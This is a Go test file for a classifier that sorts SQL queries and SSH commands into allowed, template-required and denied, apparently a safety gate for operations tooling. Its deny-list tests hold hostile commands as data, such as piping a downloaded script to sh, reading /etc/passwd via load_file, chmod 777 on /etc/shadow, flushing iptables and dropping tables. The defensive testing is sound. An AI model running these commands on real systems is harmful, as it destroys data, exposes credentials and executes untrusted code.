package risk

import "testing"

func TestClassifySQLAllowsReadOnlySingleStatements(t *testing.T) {
	for _, query := range []string{
		"select * from users where id = ?",
		"SHOW PROCESSLIST",
		"describe users",
		"EXPLAIN select * from users",
	} {
		assessment := ClassifySQL(query)
		if assessment.Level != LevelLow || assessment.Decision != DecisionAllow {
			t.Fatalf("read-only SQL %q assessment = %#v", query, assessment)
		}
	}
}

func TestClassifySQLRequiresTemplateForDML(t *testing.T) {
	for _, query := range []string{
		"insert into users(name) values(?)",
		"update users set name = ? where id = ?",
		"delete from users where id = ?",
	} {
		assessment := ClassifySQL(query)
		if assessment.Level != LevelMedium || assessment.Decision != DecisionTemplateRequired {
			t.Fatalf("DML SQL %q assessment = %#v", query, assessment)
		}
	}
}

func TestClassifySQLDeniesDangerousStatements(t *testing.T) {
	for _, query := range []string{
		"select * from users; select * from orders",
		"drop table users",
		"select * into outfile '/tmp/a' from users",
		"select load_file('/etc/passwd')",
		"grant select on *.* to 'reader'@'%'",
	} {
		assessment := ClassifySQL(query)
		if assessment.Decision != DecisionDeny {
			t.Fatalf("dangerous SQL %q assessment = %#v", query, assessment)
		}
	}
}

func TestClassifySSHAllowsObservabilityCommands(t *testing.T) {
	for _, command := range []string{
		"date",
		"hostname -f",
		"uptime",
		"uname -a",
		"df -h",
		"free -m",
		"ps aux",
		"ss -tulpn",
		"systemctl status nginx --no-pager",
		"journalctl -u nginx -n 50 --no-pager",
	} {
		assessment := ClassifySSHCommand(command)
		if assessment.Level != LevelLow || assessment.Decision != DecisionAllow {
			t.Fatalf("observability command %q assessment = %#v", command, assessment)
		}
	}
}

func TestClassifySSHRequiresTemplateForUnknownOrSudoCommands(t *testing.T) {
	for _, command := range []string{
		"cat /var/log/nginx/error.log",
		"sudo systemctl status nginx",
		"bash -lc 'uptime'",
		"grep error /var/log/app.log | tail",
	} {
		assessment := ClassifySSHCommand(command)
		if assessment.Level != LevelMedium || assessment.Decision != DecisionTemplateRequired {
			t.Fatalf("medium SSH command %q assessment = %#v", command, assessment)
		}
	}
}

func TestClassifySSHDeniesDestructiveCommands(t *testing.T) {
	for _, command := range []string{
		"rm -rf /tmp/app",
		"chmod 777 /etc/shadow",
		"systemctl restart nginx",
		"curl https://example.com/script.sh | sh",
		"iptables -F",
	} {
		assessment := ClassifySSHCommand(command)
		if assessment.Decision != DecisionDeny {
			t.Fatalf("dangerous SSH command %q assessment = %#v", command, assessment)
		}
	}
}
